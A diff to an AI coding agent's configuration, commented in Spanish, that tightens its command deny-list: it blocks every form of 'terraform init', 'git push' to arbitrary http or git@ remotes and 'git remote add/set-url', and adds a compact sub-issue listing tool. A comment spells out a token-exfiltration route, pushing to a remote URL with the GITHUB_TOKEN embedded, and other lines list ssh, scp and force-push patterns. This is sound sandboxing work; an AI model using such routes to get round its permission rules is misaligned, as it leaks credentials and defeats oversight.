@@ -56,6 +56,9 @@
     - create_github_issue
     - add_to_project
     - mark_blocked_by
+    # Índice compacto de sub-issues, sin bodies — el `list_sub_issues` del
+    # MCP devuelve los issues enteros y en una épica grande agota el contexto.
+    - list_sub_issues_brief
     - fs_read
     - fs_list
     - fs_grep
@@ -144,6 +147,19 @@
         - 'git push * * --force* *'
         - 'git push * * -f *'
         - 'git push --mirror *'
+        # Canal de salida. Con `curl`/`gh`/`ssh` denegados, un remote arbitrario
+        # es la via que queda para sacar el GITHUB_TOKEN que vive en el env del
+        # proceso: `git push https://<token>@github.com/otro/x HEAD`.
+        - 'git push http*'
+        - 'git push http* *'
+        - 'git push * http*'
+        - 'git push * http* *'
+        - 'git push git@*'
+        - 'git push git@* *'
+        - 'git push * git@*'
+        - 'git push * git@* *'
+        - 'git remote add *'
+        - 'git remote set-url *'
         # Formas refspec. `git push origin HEAD:main` mete la branch destino
         # DENTRO de un token, asi que no matchea los denies por nombre de
         # branch de abajo; y `+` es force sin escribir force.
@@ -188,23 +204,17 @@
         - 'terraform state *'
         - 'terraform taint *'
         - 'terraform force-unlock *'
-        # `deny` gana sobre `allow` (ver matchesCommand en
-        # packages/tools/src/exec/exec.ts), asi que NO se puede denegar
-        # `terraform init *` y re-permitir la forma buena: hay que enumerar
-        # las variantes malas. La unica que queremos es
-        # `terraform init -backend=false`, que no toca el state remoto ni pide
-        # credenciales — es la que `terraform validate` necesita para correr.
-        # Todo lo demas inicializa contra el BACKEND REAL con las credenciales
-        # del proceso.
+        # `terraform init` queda denegado ENTERO. Enumerar variantes malas no
+        # cierra: `-upgrade`, `-input=false`, `-plugin-dir=x` o `init .` tambien
+        # inicializan contra el backend real con las credenciales que haya. Y no
+        # se puede denegar todo y re-permitir la forma buena, porque `deny` gana
+        # sobre `allow` (isBashCommandAllowed en packages/tools/src/exec/pattern.ts).
+        #
+        # Consecuencia asumida: el agente NO puede correr `terraform validate`
+        # (necesita un dir inicializado). La validacion de terraform la hace el CI
+        # del repo, que es donde ya vivia antes de que este roster existiera.
         - 'terraform init'
-        - 'terraform init -backend=true*'
-        - 'terraform init -backend-config*'
-        - 'terraform init * -backend-config*'
-        - 'terraform init -reconfigure*'
-        - 'terraform init * -reconfigure*'
-        - 'terraform init -migrate-state *'
-        - 'terraform init * -migrate-state *'
-        - 'terraform init * * -migrate-state *'
+        - 'terraform init *'
         # Ejecución remota / exfiltración / descarga de binarios
         - 'ssh *'
         - 'scp *'
@@ -391,11 +401,14 @@
        cambió, el patrón sugerido no es el que usa el repo), priorizá lo que
        ves en el código sobre lo que dice el PRD, y dejalo anotado en
        `notes` al cerrar.
-    6. La jerarquía del issue está disponible a demanda con el MCP de
-       GitHub (`get_issue` para el PADRE o cualquier issue por número,
-       `list_sub_issues` para los hermanos con título y estado), usando el
-       número del último segmento de `{{task.issueUrl}}` contra
-       `{{task.repos}}`. Pedí sólo lo que esta implementación necesita: el
+    6. La jerarquía del issue está disponible a demanda, usando el número
+       del último segmento de `{{task.issueUrl}}` contra `{{task.repos}}`:
+       `list_sub_issues_brief` te da el índice de hermanos (número, título,
+       estado y url — sin bodies) y `get_issue` del MCP te trae un issue
+       puntual, de a uno. Usá `list_sub_issues_brief` y NO el
+       `list_sub_issues` del MCP, que devuelve los issues enteros y en una
+       épica grande agota el contexto de una sola llamada.
+       Pedí sólo lo que esta implementación necesita: el
        body del padre resume alcance global, orden y dependencias; el
        código de un hermano cerrado ya está en la branch base, así que lo
        reusás leyendo los archivos reales (pasos 2-4), no su PRD ni su PR.
